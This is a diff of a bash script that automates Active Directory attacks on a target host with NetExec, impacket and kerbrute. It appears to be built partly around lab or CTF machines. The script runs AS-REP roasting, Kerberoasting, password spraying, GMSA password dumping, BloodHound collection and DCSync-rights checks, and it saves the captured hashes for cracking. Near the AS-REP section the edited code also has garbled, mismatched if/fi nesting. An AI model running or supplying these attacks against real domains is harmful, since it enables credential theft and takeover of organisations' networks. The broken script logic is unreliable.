@@ -79,28 +79,64 @@ check_port() {
     fi
 }
 
-# Function to auto-detect the target OS
-detect_os() {
-    log_info "Attempting to auto-detect target OS for $IP..."
+# Function to auto-detect the target OS and Domain info
+detect_target_info() {
+    log_info "Attempting to auto-detect target OS and Domain for $IP..."
     
-    # Priority 1: SMB (Port 445) - Very reliable for Windows
+    # Priority 1: SMB (Port 445) - Very reliable for Windows/AD
     if check_port $IP 445; then
         # Try to get OS info from nxc smb
-        log_info "SMB port 445 is open. Checking OS version with NetExec..."
+        log_info "SMB port 445 is open. Checking info with NetExec..."
         smb_out=$(nxc smb $IP --timeout 5 2>&1)
+        
+        # Extract OS type
         if echo "$smb_out" | grep -qi "windows"; then
             os_type="windows"
             log_success "Auto-detected OS: ${BWHITE}Windows${NC} (via NetExec SMB)"
-            return 0
         elif echo "$smb_out" | grep -qi "linux\|samba"; then
             os_type="linux"
             log_success "Auto-detected OS: ${BWHITE}Linux/Samba${NC} (via NetExec SMB)"
-            return 0
         else
             os_type="windows"
             log_info "SMB port 445 open, assuming ${BWHITE}Windows${NC}."
-            return 0
         fi
+
+        # Extract Domain if not already provided
+        if [ -z "$domain" ]; then
+            discovered_domain=$(echo "$smb_out" | grep -oP '(?<=domain:)[^\)]+' | head -n1 | tr -d ' ')
+            discovered_name=$(echo "$smb_out" | grep -oP '(?<=name:)[^\)]+' | head -n1 | tr -d ' ')
+            
+            if [ -n "$discovered_domain" ] && [ "$discovered_domain" != "$IP" ]; then
+                domain="$discovered_domain"
+                log_success "Auto-discovered domain: ${BWHITE}$domain${NC}"
+                
+                # Check if FQDN or just domain
+                full_host=""
+                if [ -n "$discovered_name" ]; then
+                    full_host="$discovered_name.$domain"
+                fi
+
+                # Prompt to add to /etc/hosts
+                hosts_entry="$IP $domain"
+                [ -n "$full_host" ] && hosts_entry="$IP $full_host $domain"
+                
+                if ! grep -q "$domain" /etc/hosts 2>/dev/null; then
+                    echo -e "\n${BYELLOW}❓ Do you want to add '${BWHITE}$hosts_entry${NC}${BYELLOW}' to /etc/hosts?${NC}"
+                    echo -e "${BCYAN}   (Recommended for better Kerberos/DNS resolution)${NC}"
+                    read -p "   [y/N]: " choice
+                    case "$choice" in 
+                        y|Y ) 
+                            echo "$hosts_entry" | sudo tee -a /etc/hosts >/dev/null
+                            log_success "Added to /etc/hosts"
+                            ;;
+                        * ) log_info "Skipping /etc/hosts update";;
+                    esac
+                else
+                    log_info "Domain already exists in /etc/hosts"
+                fi
+            fi
+        fi
+        return 0
     fi
 
     # Priority 2: RDP (Port 3389) - Almost always Windows
@@ -248,9 +284,31 @@ if [ -z "$IP" ]; then
     usage
 fi
 
-# Auto-detect OS if not specified
-if [ -z "$os_type" ]; then
-    detect_os
+# Auto-detect OS and Domain if not specified
+if [ -z "$os_type" ] || [ -z "$domain" ]; then
+    detect_target_info
+fi
+
+# Initialize global flags
+if [ -n "$domain" ]; then DOMAIN_FLAG="-d $domain"; else DOMAIN_FLAG=""; fi
+
+# Initial build of user flags
+if [ -n "$hash" ]; then
+    USER_FLAG="-u $user -H $hash"
+    RPC_ARG="-U $domain\\\\$user --pw-nt-hash $hash"
+    SECRETS_ARG="-hashes :$hash $domain/$user@$IP"
+    RPCDUMP_ARG="-u $user -hashes :$hash -d $domain"
+elif [ -n "$pass" ]; then
+    USER_FLAG="-u $user -p '$pass'"
+    RPC_ARG="-U $domain\\\\$user%'$pass'"
+    SECRETS_ARG="$domain/$user:'$pass'@$IP"
+    RPCDUMP_ARG="-u $user -p '$pass' -d $domain"
+else
+    # Allow for user files or empty creds
+    USER_FLAG="-u '$user' -p ''"
+    RPC_ARG="-U $domain\\\\$user%"
+    SECRETS_ARG="$domain/$user@$IP"
+    RPCDUMP_ARG="-u '$user' -d $domain"
 fi
 
 # Check for dependencies
@@ -498,8 +556,8 @@ if [ "$os_type" = "windows" ]; then
 
     # LDAP domain SID (requires credentials)
     if [ -n "$user" ]; then
-        print_cmd "nxc ldap $IP $USER_FLAG --get-sid --users"
-        unbuffer nxc ldap $IP $USER_FLAG --get-sid --users | tee nxc-enum/ldap/domain-sid.txt
+        print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --get-sid --users"
+        unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --get-sid --users | tee nxc-enum/ldap/domain-sid.txt
     else
         log_info "Skipping LDAP domain SID (no credentials supplied)"
     fi
@@ -653,29 +711,6 @@ if [ "$os_type" = "windows" ]; then
         fi
     fi
     
-    # --- Auto-Domain Discovery ---
-    if [ -z "$domain" ]; then
-        # Try to extract DNS domain (priority) or NetBIOS domain from nxc output
-        discovered_domain=$(echo "$guest_output $anon_output" | grep -oP '(?<=domain:)[^\)]+' | head -n1 | tr -d ' ')
-        
-        if [ -n "$discovered_domain" ]; then
-            domain="$discovered_domain"
-            DOMAIN_FLAG="-d $domain"
-            log_success "Auto-discovered domain: ${BWHITE}$domain${NC}"
-            log_info "Updating flags for subsequent scans (LDAP, RDP, WinRM)..."
-            
-            # Re-build RPC/SECRETS arguments that rely on domain
-            if [ -n "$user" ]; then
-                if [ -n "$hash" ]; then
-                    RPC_ARG="-U $domain\\\\$user --pw-nt-hash $hash"
-                    SECRETS_ARG="-hashes :$hash $domain/$user@$IP"
-                elif [ -n "$pass" ]; then
-                    RPC_ARG="-U $domain\\\\$user%$pass"
-                    SECRETS_ARG="$domain/$user:$pass@$IP"
-                fi
-            fi
-        fi
-    fi
     # ----------------------------
 else
     log_info "Skipping Windows-specific Guest/Anonymous SMB checks (target OS: Linux)"
@@ -852,31 +887,19 @@ if [ "$os_type" = "windows" ] || check_port $IP 445 || check_port $IP 139; then
     
     # Continue with AS-REP roasting if we have a users file
     if [ -n "$users_file" ] && [ -s "$users_file" ]; then
-        
+
         # AS-REP Roasting with GetNPUsers.py
         log_section "AS-REP Roasting"
-        
-        # Try to get domain name
-        if [ -n "$domain" ]; then
-            domain_name="$domain"
-        else
-            # Try to extract from guest output first
-            domain_name=$(echo "$guest_output" | grep -oP '(?<=domain:)[^\)]+' | head -n1 | tr -d ' ')
-            
-            # If not found, try anonymous output
-            if [ -z "$domain_name" ]; then
-                domain_name=$(echo "$anon_output" | grep -oP '(?<=domain:)[^\)]+' | head -n1 | tr -d ' ')
-            fi
-            
-            # If still not found, try lookupsid output
-            if [ -z "$domain_name" ]; then
-                domain_name=$(echo "$lookupsid_output" | grep -oP 'VULNNET-RST|[A-Z]+-[A-Z]+' | head -n1)
-            fi
+
+        # Use global domain if available, otherwise try to extract it from discovery files
+        if [ -z "$domain" ] || [ "$domain" == "DOMAIN" ]; then
+            domain=$(grep -oP '(?<=domain:)[^\)]+' nxc-enum/smb/*anon*.txt 2>/dev/null | head -n1 | tr -d ' ')
+            [ -z "$domain" ] && domain=$(echo "$lookupsid_output" | grep -oP 'VULNNET-RST|[A-Z]+-[A-Z]+' | head -n1)
         fi
-        
-        if [ -n "$domain_name" ] && [ "$domain_name" != "DOMAIN" ]; then
-            log_info "Using domain: ${BWHITE}$domain_name${NC}"
-            
+
+        if [ -n "$domain" ] && [ "$domain" != "DOMAIN" ]; then
+            log_info "Using domain: ${BWHITE}$domain${NC}"
+
             # Check if Kerberos port is open to avoid long timeouts
             if ! check_port $IP 88 "Kerberos"; then
                 log_warning "Port 88 (Kerberos) seems closed. AS-REP Roasting will likely fail or be very slow."
@@ -884,13 +907,13 @@ if [ "$os_type" = "windows" ] || check_port $IP 445 || check_port $IP 139; then
             fi
 
             log_info "Attempting AS-REP Roasting (this can take a while if port 88 is filtered)..."
-            print_cmd "impacket-GetNPUsers \"${domain_name}/\" -usersfile \"$users_file\" -no-pass -dc-ip $IP"
+            print_cmd "impacket-GetNPUsers \"${domain}/\" -usersfile \"$users_file\" -no-pass -dc-ip $IP"
             # Apply a 2-minute timeout to prevent infinite hanging
-            getnpusers_output=$(timeout 120s impacket-GetNPUsers "${domain_name}/" -usersfile "$users_file" -no-pass -dc-ip $IP 2>/dev/null)
-            
+            getnpusers_output=$(timeout 120s impacket-GetNPUsers "${domain}/" -usersfile "$users_file" -no-pass -dc-ip $IP 2>/dev/null)
+
             if [ -z "$getnpusers_output" ] || [[ "$getnpusers_output" == *"Connection refused"* ]]; then
-                print_cmd "GetNPUsers.py \"${domain_name}/\" -usersfile \"$users_file\" -no-pass -dc-ip $IP"
-                getnpusers_output=$(timeout 120s GetNPUsers.py "${domain_name}/" -usersfile "$users_file" -no-pass -dc-ip $IP 2>/dev/null)
+                print_cmd "GetNPUsers.py \"${domain}/\" -usersfile \"$users_file\" -no-pass -dc-ip $IP"
+                getnpusers_output=$(timeout 120s GetNPUsers.py "${domain}/" -usersfile "$users_file" -no-pass -dc-ip $IP 2>/dev/null)
             fi
 
             if [ -n "$getnpusers_output" ]; then
@@ -898,15 +921,15 @@ if [ "$os_type" = "windows" ] || check_port $IP 445 || check_port $IP 139; then
             else
                 log_warning "AS-REP Roasting timed out or failed to produce output."
             fi
-            
+
             # Check if any AS-REP roastable users were found
             if echo "$getnpusers_output" | grep -q '\$krb5asrep\$'; then
                 # Extract just the hashes to a clean file
                 grep '\$krb5asrep\$' nxc-enum/smb/asrep-getnpusers.txt > nxc-enum/smb/asrep-hashes.txt
-                
+
                 # Extract vulnerable usernames
                 vulnerable_users=$(grep '\$krb5asrep\$' nxc-enum/smb/asrep-getnpusers.txt | grep -oP '\$krb5asrep\$23\$\K[^@]+' | tr '\n' ', ' | sed 's/,$//')
-                
+
                 log_success "AS-REP Roastable users found: ${BRED}$vulnerable_users${NC}"
                 log_info "Full output: ${BWHITE}nxc-enum/smb/asrep-getnpusers.txt${NC}"
                 log_info "Clean hashes: ${BWHITE}nxc-enum/smb/asrep-hashes.txt${NC}"
@@ -920,10 +943,10 @@ if [ "$os_type" = "windows" ] || check_port $IP 445 || check_port $IP 139; then
                 log_info "Show cracked passwords:"
                 echo "john --show nxc-enum/smb/asrep-hashes.txt"
             fi
-            
+
             # --- Additional User Attacks ---
             log_section "Additional User Attacks"
-            
+
             # 1. Kerbrute User Enumeration (Validation)
             # Check if kerbrute is in PATH, if not check distinct location
             KERBRUTE_CMD="kerbrute"
@@ -941,44 +964,43 @@ if [ "$os_type" = "windows" ] || check_port $IP 445 || check_port $IP 139; then
                  log_info "Kerbrute User Validation"
                  if [ -n "$pass" ]; then
                      log_info "Password provided ('$pass'), running Password Spray instead of just User Enumeration..."
-                     print_cmd "$KERBRUTE_CMD passwordspray -d \"$domain_name\" --dc $IP \"$users_file\" \"$pass\""
-                     timeout 300s "$KERBRUTE_CMD" passwordspray -d "$domain_name" --dc $IP "$users_file" "$pass" 2>/dev/null | tee nxc-enum/smb/kerbrute-spray.txt
+                     print_cmd "$KERBRUTE_CMD passwordspray -d \"$domain\" --dc $IP \"$users_file\" \"$pass\""
+                     timeout 300s "$KERBRUTE_CMD" passwordspray -d "$domain" --dc $IP "$users_file" "$pass" 2>/dev/null | tee nxc-enum/smb/kerbrute-spray.txt
                  else
-                     print_cmd "$KERBRUTE_CMD userenum -d \"$domain_name\" --dc $IP \"$users_file\""
-                     timeout 60s "$KERBRUTE_CMD" userenum -d "$domain_name" --dc $IP "$users_file" 2>/dev/null | tee nxc-enum/smb/kerbrute-validation.txt
+                     print_cmd "$KERBRUTE_CMD userenum -d \"$domain\" --dc $IP \"$users_file\""
+                     timeout 60s "$KERBRUTE_CMD" userenum -d "$domain" --dc $IP "$users_file" 2>/dev/null | tee nxc-enum/smb/kerbrute-validation.txt
                  fi
             else
                  log_warning "kerbrute not found (checked PATH and ~/.local/bin). Skipping user validation."
             fi
-            
+
             # 2. NetView Enumeration (Network/Session info)
             log_info "NetView Network Enumeration"
             # NetView usually needs a valid user/pass, checking if we have one, otherwise runs limited
             if [ -n "$user" ] && [ -n "$pass" ]; then
-                 print_cmd "impacket-netview \"$domain_name\"/\"$user\":\"$pass\"@$IP"
-                 impacket-netview "$domain_name"/"$user":"$pass"@$IP 2>/dev/null | tee nxc-enum/smb/netview-auth.txt
+                 print_cmd "impacket-netview \"$domain\"/\"$user\":\"$pass\"@$IP"
+                 impacket-netview "$domain"/"$user":"$pass"@$IP 2>/dev/null | tee nxc-enum/smb/netview-auth.txt
             else
                  # Try with empty/anonymous if no creds yet (likely fails but worth a shot if Null session allowed)
-                 print_cmd "impacket-netview \"$domain_name\"/''@$IP -no-pass"
-                 impacket-netview "$domain_name"/''@$IP -no-pass 2>/dev/null | tee nxc-enum/smb/netview-anon.txt
+                 print_cmd "impacket-netview \"$domain\"/''@$IP -no-pass"
+                 impacket-netview "$domain"/''@$IP -no-pass 2>/dev/null | tee nxc-enum/smb/netview-anon.txt
             fi
 
             # 3. GetTGT (Check for TGT acquisition)
             log_info "GetTGT Check"
             echo "[*] TGT acquisition requires a valid password/hash."
             echo "[*] If you crack an AS-REP hash, get a TGT with:"
-            echo "    impacket-getTGT $domain_name/<user>:<password>"
+            echo "    impacket-getTGT $domain/<user>:<password>"
             echo ""
             # --- End New Checks ---
 
-            else
+        else
             log_warning "Could not auto-detect domain name"
             log_info "Run manually with: GetNPUsers.py DOMAIN/ -usersfile $users_file -no-pass -dc-ip $IP"
             log_info "Or re-run script with: ./nxc-auto.sh -i $IP -d DOMAIN"
-            fi
-            echo ""
-            fi
-            else
+        fi
+        echo ""
+    fi            else
             log_info "Skipping Windows-specific anonymous RPC/AD enumeration (target OS: Linux)"
             fi
 
@@ -1006,13 +1028,23 @@ if [ "$os_type" = "windows" ] || check_port $IP 445 || check_port $IP 139; then
                 fi
 
                 log_section "LDAP Anonymous Access"
-                print_cmd "nxc ldap $IP -u '' -p '' --timeout 30"
-                ldap_output=$(timeout 60s nxc ldap $IP -u '' -p '' --timeout 30)
-                echo "$ldap_output"
+                if ! check_port $IP 389 "LDAP"; then
+                    log_warning "Port 389 (LDAP) seems closed. Skipping LDAP Anonymous Access."
+                    ldap_output=""
+                else
+                    log_info "Attempting LDAP Anonymous Access..."
+                    print_cmd "nxc ldap $IP -u '' -p '' --timeout 15"
+                    ldap_output=$(timeout 30s nxc ldap $IP -u '' -p '' --timeout 15)
+                    echo "$ldap_output"
+                fi
 
                 # Check if anonymous LDAP access succeeded (via nxc OR manual check)
-                print_cmd "ldapsearch -x -H ldap://$IP -s base namingContexts"
-                verify_ldap_anon=$(ldapsearch -x -H ldap://$IP -s base namingContexts 2>/dev/null)
+                if [ -n "$ldap_output" ]; then
+                    print_cmd "ldapsearch -x -H ldap://$IP -s base namingContexts"
+                    verify_ldap_anon=$(timeout 15s ldapsearch -x -H ldap://$IP -s base namingContexts 2>/dev/null)
+                else
+                    verify_ldap_anon=""
+                fi
 
                 if echo "$ldap_output" | grep -q "\[+\]" || echo "$verify_ldap_anon" | grep -q "namingContexts"; then
                     log_success "Anonymous LDAP access verified! Attempting to dump data..."
@@ -1065,14 +1097,20 @@ if [ "$os_type" = "windows" ] || check_port $IP 445 || check_port $IP 139; then
 
                 log_section "LDAP Guest Access"
                 # Try with guest account
-                if [ -n "$domain" ]; then
-                    print_cmd "nxc ldap $IP -d \"$domain\" -u 'guest' -p '' --timeout 30"
-                    ldap_guest_output=$(timeout 60s nxc ldap $IP -d "$domain" -u 'guest' -p '' --timeout 30)
+                if ! check_port $IP 389 "LDAP"; then
+                    log_warning "Port 389 (LDAP) seems closed. Skipping LDAP Guest Access."
+                    ldap_guest_output=""
                 else
-                    print_cmd "nxc ldap $IP -u 'guest' -p '' --timeout 30"
-                    ldap_guest_output=$(timeout 60s nxc ldap $IP -u 'guest' -p '' --timeout 30)
+                    log_info "Attempting LDAP Guest Access..."
+                    if [ -n "$domain" ]; then
+                        print_cmd "nxc ldap $IP -d \"$domain\" -u 'guest' -p '' --timeout 15"
+                        ldap_guest_output=$(timeout 30s nxc ldap $IP -d "$domain" -u 'guest' -p '' --timeout 15)
+                    else
+                        print_cmd "nxc ldap $IP -u 'guest' -p '' --timeout 15"
+                        ldap_guest_output=$(timeout 30s nxc ldap $IP -u 'guest' -p '' --timeout 15)
+                    fi
+                    echo "$ldap_guest_output"
                 fi
-                echo "$ldap_guest_output"
 
                 if echo "$ldap_guest_output" | grep -q "\[+\]"; then
                     log_success "Guest LDAP access successful! Attempting to dump data..."
@@ -1729,8 +1767,8 @@ if [ "$os_type" = "windows" ]; then
         unbuffer nxc smb $IP $USER_FLAG --loggedon-users 2>/dev/null | tee nxc-enum/smb/logged-users.txt
     
         log_section "Admin User Count"
-        print_cmd "nxc ldap $IP $USER_FLAG --users --admin-count"
-        unbuffer nxc ldap $IP $USER_FLAG --users --admin-count 2>/dev/null | tee nxc-enum/ldap/admin-count-users.txt
+        print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --users --admin-count"
+        unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --users --admin-count 2>/dev/null | tee nxc-enum/ldap/admin-count-users.txt
     
         log_section "RID Brute Force"
         print_cmd "nxc smb $IP $USER_FLAG --rid-brute"
@@ -1764,8 +1802,8 @@ if [ "$os_type" = "windows" ]; then
     # LDAP modules require actual authentication - skip if no password/hash
     if [ -n "$user" ] && { [ -n "$pass" ] || [ -n "$hash" ]; }; then
         log_section "GMSA Passwords"
-        print_cmd "nxc ldap $IP $USER_FLAG --users --gmsa"
-        unbuffer nxc ldap $IP $USER_FLAG --users --gmsa 2>/dev/null | tee nxc-enum/ldap/gmsa.txt  
+        print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --users --gmsa"
+        unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --users --gmsa 2>/dev/null | tee nxc-enum/ldap/gmsa.txt  
     
         log_section "Anti-Virus Check"
         print_cmd "nxc smb $IP $USER_FLAG -M enum_av"
@@ -1795,28 +1833,28 @@ if [ "$os_type" = "windows" ]; then
         fi
     
         log_info "Machine Account Quota (maq)"
-        print_cmd "nxc ldap $IP $USER_FLAG --users -M maq"
-        unbuffer nxc ldap $IP $USER_FLAG --users -M maq 2>/dev/null | tee nxc-enum/ldap/maq.txt
+        print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --users -M maq"
+        unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --users -M maq 2>/dev/null | tee nxc-enum/ldap/maq.txt
     
         log_info "ADCS Templates"
-        print_cmd "nxc ldap $IP $USER_FLAG --users -M adcs"
-        unbuffer nxc ldap $IP $USER_FLAG --users -M adcs 2>/dev/null | tee nxc-enum/ldap/adcs.txt
+        print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --users -M adcs"
+        unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --users -M adcs 2>/dev/null | tee nxc-enum/ldap/adcs.txt
     
         log_info "User Descriptions"
-        print_cmd "nxc ldap $IP $USER_FLAG --users -M get-desc-users"
-        unbuffer nxc ldap $IP $USER_FLAG --users -M get-desc-users 2>/dev/null | tee nxc-enum/ldap/desc-users.txt
+        print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --users -M get-desc-users"
+        unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --users -M get-desc-users 2>/dev/null | tee nxc-enum/ldap/desc-users.txt
     
         log_info "LDAP Checker"
-        print_cmd "nxc ldap $IP $USER_FLAG --users -M ldap-checker"
-        unbuffer nxc ldap $IP $USER_FLAG --users -M ldap-checker 2>/dev/null | tee nxc-enum/ldap/ldap-checker.txt
+        print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --users -M ldap-checker"
+        unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --users -M ldap-checker 2>/dev/null | tee nxc-enum/ldap/ldap-checker.txt
     
         log_info "Password Not Required"
-        print_cmd "nxc ldap $IP $USER_FLAG --users --password-not-required"
-        unbuffer nxc ldap $IP $USER_FLAG --users --password-not-required 2>/dev/null | tee nxc-enum/ldap/password-not-required.txt
+        print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --users --password-not-required"
+        unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --users --password-not-required 2>/dev/null | tee nxc-enum/ldap/password-not-required.txt
     
         log_info "Trusted For Delegation"
-        print_cmd "nxc ldap $IP $USER_FLAG --users --trusted-for-delegation"
-        unbuffer nxc ldap $IP $USER_FLAG --users --trusted-for-delegation 2>/dev/null | tee nxc-enum/ldap/trusted-for-delegation.txt
+        print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --users --trusted-for-delegation"
+        unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --users --trusted-for-delegation 2>/dev/null | tee nxc-enum/ldap/trusted-for-delegation.txt
     
         log_section "AD CS Enumeration (Certipy)"
         # Check if certipy is in PATH, if not check distinct location
@@ -1862,8 +1900,8 @@ if [ "$os_type" = "windows" ]; then
 
         log_section "Kerberoasting"
         rm -f nxc-enum/ldap/kerberoasting.txt kerberoasting.txt 2>/dev/null
-        print_cmd "nxc ldap $IP $USER_FLAG --kdcHost $IP --kerberoasting nxc-enum/ldap/kerberoasting.txt"
-        unbuffer nxc ldap $IP $USER_FLAG --kdcHost $IP --kerberoasting nxc-enum/ldap/kerberoasting.txt 2>/dev/null
+        print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --kdcHost $IP --kerberoasting nxc-enum/ldap/kerberoasting.txt"
+        unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --kdcHost $IP --kerberoasting nxc-enum/ldap/kerberoasting.txt 2>/dev/null
         if [ -s nxc-enum/ldap/kerberoasting.txt ] && grep -q 'krb5tgs' nxc-enum/ldap/kerberoasting.txt 2>/dev/null; then
             cp nxc-enum/ldap/kerberoasting.txt ./kerberoasting.txt
             log_success "Kerberoast hashes found! Saved to ${BWHITE}kerberoasting.txt${NC}"
@@ -1890,8 +1928,8 @@ if [ "$os_type" = "windows" ]; then
     
         log_section "AS-REProasting (LDAP)"
         rm -f nxc-enum/ldap/asreproasting.txt asreproasting.txt 2>/dev/null
-        print_cmd "nxc ldap $IP $USER_FLAG --kdcHost $IP --asreproast nxc-enum/ldap/asreproasting.txt"
-        unbuffer nxc ldap $IP $USER_FLAG --kdcHost $IP --asreproast nxc-enum/ldap/asreproasting.txt 2>/dev/null
+        print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --kdcHost $IP --asreproast nxc-enum/ldap/asreproasting.txt"
+        unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --kdcHost $IP --asreproast nxc-enum/ldap/asreproasting.txt 2>/dev/null
         if [ -s nxc-enum/ldap/asreproasting.txt ] && grep -q 'krb5asrep' nxc-enum/ldap/asreproasting.txt 2>/dev/null; then
             cp nxc-enum/ldap/asreproasting.txt ./asreproasting.txt
             log_success "AS-REP hashes found! Saved to ${BWHITE}asreproasting.txt${NC}"
@@ -1918,8 +1956,8 @@ if [ "$os_type" = "windows" ]; then
         
         log_section "BloodHound Data Collection"
         log_info "Collecting all data (-c all)..."
-        print_cmd "nxc ldap $IP $USER_FLAG --bloodhound -c all --dns-server $IP"
-        bh_output=$(unbuffer nxc ldap $IP $USER_FLAG --bloodhound -c all --dns-server $IP 2>&1 | tee nxc-enum/ldap/bloodhound-collection.txt)
+        print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --bloodhound -c all --dns-server $IP"
+        bh_output=$(unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --bloodhound -c all --dns-server $IP 2>&1 | tee nxc-enum/ldap/bloodhound-collection.txt)
         echo "$bh_output"
         
         # Extract zip filename and suggest next steps
@@ -1935,8 +1973,8 @@ if [ "$os_type" = "windows" ]; then
     
     if [ -n "$user" ]; then
         log_section "Domain Controllers"
-        print_cmd "nxc ldap $IP $USER_FLAG --dc-list"
-        unbuffer nxc ldap $IP $USER_FLAG --dc-list | tee nxc-enum/ldap/domain-controllers.txt
+        print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --dc-list"
+        unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --dc-list | tee nxc-enum/ldap/domain-controllers.txt
     
         log_section "SMB Module Enumeration"
     
@@ -2210,8 +2248,8 @@ if [ "$os_type" = "windows" ] && [ -n "$user" ] && { [ -n "$pass" ] || [ -n "$ha
     log_section "Advanced DACL Enumeration"
 
     log_info "Administrator's ACE"
-    print_cmd "nxc ldap $IP $USER_FLAG -M daclread -o TARGET=Administrator ACTION=read"
-    unbuffer nxc ldap $IP $USER_FLAG -M daclread -o TARGET=Administrator ACTION=read 2>/dev/null | tee nxc-enum/ldap/admin-ace.txt
+    print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG -M daclread -o TARGET=Administrator ACTION=read"
+    unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG -M daclread -o TARGET=Administrator ACTION=read 2>/dev/null | tee nxc-enum/ldap/admin-ace.txt
 
     # Build domain DN from domain name
     if [ -n "$domain" ]; then
@@ -2219,8 +2257,8 @@ if [ "$os_type" = "windows" ] && [ -n "$user" ] && { [ -n "$pass" ] || [ -n "$ha
         domain_dn=$(echo "$domain" | sed 's/\./,DC=/g' | sed 's/^/DC=/')
 
         log_info "DCSync Rights"
-        print_cmd "nxc ldap $IP $USER_FLAG -M daclread -o TARGET_DN=\"$domain_dn\" ACTION=read RIGHTS=DCSync"
-        unbuffer nxc ldap $IP $USER_FLAG -M daclread -o TARGET_DN="$domain_dn" ACTION=read RIGHTS=DCSync 2>/dev/null | tee nxc-enum/ldap/dcsync-rights.txt
+        print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG -M daclread -o TARGET_DN=\"$domain_dn\" ACTION=read RIGHTS=DCSync"
+        unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG -M daclread -o TARGET_DN="$domain_dn" ACTION=read RIGHTS=DCSync 2>/dev/null | tee nxc-enum/ldap/dcsync-rights.txt
 
         log_info "What these checks reveal:"
         echo "  - Administrator ACE: Shows who can modify the Administrator account"
